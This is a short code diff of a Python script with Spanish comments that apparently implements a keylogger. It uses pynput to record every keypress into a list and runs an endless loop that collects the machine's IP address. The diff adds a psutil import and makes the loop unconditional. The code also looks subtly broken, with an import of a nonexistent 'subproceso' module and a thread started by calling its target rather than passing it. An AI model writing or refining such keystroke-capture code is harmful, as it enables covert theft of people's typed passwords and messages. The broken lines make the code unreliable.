@@ -5,7 +5,7 @@ import socket
 import time
 from datetime import datetime
 import subproceso
-
+import psutil
 
 lista_tecla=[] #En esta lista se guardaran las palabras
 
@@ -65,7 +65,7 @@ def extrar_informacion():
             contador = contador+1
 
 def ciclo_ejecucion():
-    while presiona:
+    while True:
         time.sleep(10)
         #1.PRIMER PASO
         ip_equipo = socket.gethostbyname(socket.gethostname())
@@ -79,9 +79,6 @@ def ciclo_ejecucion():
 
 
 with pynput.keyboard.Listener(on_press=presiona) as liste:
-
     hilo = threading.Thread(target=ciclo_ejecucion()).start()
     liste.join()
-
-
-
+ 
